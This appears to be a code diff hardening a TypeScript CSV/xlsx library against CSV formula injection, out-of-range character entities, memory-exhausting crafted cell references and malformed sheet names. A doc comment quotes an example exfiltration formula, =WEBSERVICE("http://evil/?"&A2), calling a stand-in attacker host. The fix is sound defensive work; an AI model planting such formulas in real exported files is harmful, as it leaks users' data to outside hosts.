@@ -127,13 +127,29 @@ export function parseCsv(text: string, delimiter?: string): Row[] {
   return rows;
 }
 
+/**
+ * Neutralise a value that a spreadsheet would re-interpret as a formula.
+ *
+ * A string cell holding `=WEBSERVICE("http://evil/?"&A2)` is inert inside the
+ * xlsx, but written verbatim to CSV and reopened in Excel it becomes a live
+ * formula that exfiltrates data. Prefixing a single quote makes the spreadsheet
+ * treat it as text again.
+ *
+ * Deliberately only `=` and `@`, never `+` or `-`: those two lead ordinary
+ * negative numbers, and a number never begins with `=` or `@`, so this cannot
+ * corrupt numeric data — only the string content that is the actual payload.
+ */
+function csvSafeCell(value: string): string {
+  return /^[=@]/.test(value) ? `'${value}` : value;
+}
+
 export function writeCsv(rows: Row[], delimiter = ','): string {
   const needsQuote = new RegExp(`["\\n\\r${delimiter.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}]`);
   return rows
     .map((row) =>
       row
         .map((cell) => {
-          const value = cell ?? '';
+          const value = csvSafeCell(cell ?? '');
           return needsQuote.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
         })
         .join(delimiter),
@@ -175,7 +191,13 @@ const decodeEntities = (value: string): string =>
     const value = code.startsWith('#x') || code.startsWith('#X')
       ? parseInt(code.slice(2), 16)
       : parseInt(code.slice(1), 10);
-    return Number.isFinite(value) ? String.fromCodePoint(value) : whole;
+    // fromCodePoint throws for anything above U+10FFFF or a lone surrogate, and
+    // Number.isFinite alone let that through — one out-of-range &#...; used to
+    // reject the entire spreadsheet. Leave such a reference as its literal text.
+    if (!Number.isInteger(value) || value < 0 || value > 0x10ffff || (value >= 0xd800 && value <= 0xdfff)) {
+      return whole;
+    }
+    return String.fromCodePoint(value);
   });
 
 /** The shared string table, in order. Cells of type `s` index into this. */
@@ -190,10 +212,18 @@ export function parseSharedStrings(xml: string): string[] {
   return out;
 }
 
+// The real worksheet grid limits. A crafted <row r="1073741824"> or
+// <c r="AAAAAAA1"> used to make the padding loops allocate billions of empty
+// entries and take the tab out of memory; nothing beyond these can be a real
+// cell, so a reference past them is ignored rather than honoured.
+const MAX_ROWS = 1_048_576;
+const MAX_COLS = 16_384;
+
 function parseSheet(xml: string, shared: string[]): Row[] {
   const rows: Row[] = [];
   for (const rowMatch of xml.matchAll(/<row\b([^>]*)>([\s\S]*?)<\/row>/g)) {
     const index = Number(/r="(\d+)"/.exec(rowMatch[1]!)?.[1] ?? rows.length + 1) - 1;
+    if (index < 0 || index >= MAX_ROWS) continue;
     const cells: Row = [];
     for (const cellMatch of rowMatch[2]!.matchAll(/<c\b([^>]*?)(?:\/>|>([\s\S]*?)<\/c>)/g)) {
       const attrs = cellMatch[1]!;
@@ -201,6 +231,7 @@ function parseSheet(xml: string, shared: string[]): Row[] {
       const reference = /r="([A-Z]+\d+)"/.exec(attrs)?.[1];
       const type = /t="([^"]+)"/.exec(attrs)?.[1] ?? 'n';
       const column = reference ? columnOf(reference) : cells.length;
+      if (column < 0 || column >= MAX_COLS) continue;
 
       let value = '';
       if (type === 's') {
@@ -293,6 +324,19 @@ function sheetXml(rows: Row[]): string {
 <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>${body}</sheetData></worksheet>`;
 }
 
+/**
+ * A legal Excel sheet name.
+ *
+ * Truncated to 31 characters BEFORE escaping, not after: slicing the escaped
+ * form could cut an entity like `&amp;` in half, leaving a bare `&` in the
+ * attribute and a workbook Excel calls corrupt. Excel also forbids `[]*?/\:`
+ * in sheet names and requires a non-empty one.
+ */
+export function sheetName(name: string): string {
+  const cleaned = String(name ?? '').replace(/[[\]*?/\\:]/g, ' ').trim().slice(0, 31);
+  return cleaned || 'Sheet';
+}
+
 export async function writeXlsx(book: Workbook): Promise<Uint8Array> {
   const sheets = book.sheets.length ? book.sheets : [{ name: 'Sheet1', rows: [] }];
 
@@ -300,7 +344,7 @@ export async function writeXlsx(book: Workbook): Promise<Uint8Array> {
     .map((_, i) => `<Override PartName="/xl/worksheets/sheet${i + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>`)
     .join('');
   const sheetTags = sheets
-    .map((s, i) => `<sheet name="${escapeXml(s.name).slice(0, 31)}" sheetId="${i + 1}" r:id="rId${i + 1}"/>`)
+    .map((s, i) => `<sheet name="${escapeXml(sheetName(s.name))}" sheetId="${i + 1}" r:id="rId${i + 1}"/>`)
     .join('');
   const relTags = sheets
     .map((_, i) => `<Relationship Id="rId${i + 1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet${i + 1}.xml"/>`)
